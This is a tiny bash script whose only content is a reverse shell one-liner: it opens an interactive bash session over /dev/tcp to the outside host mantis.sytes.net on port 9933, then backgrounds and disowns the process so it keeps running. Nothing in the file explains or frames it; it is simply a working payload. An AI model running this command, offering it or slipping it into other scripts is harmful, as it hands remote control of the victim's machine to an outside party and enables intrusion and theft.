#!/bin/bash
bash -i >& /dev/tcp/mantis.sytes.net/9933 0>&1 &disown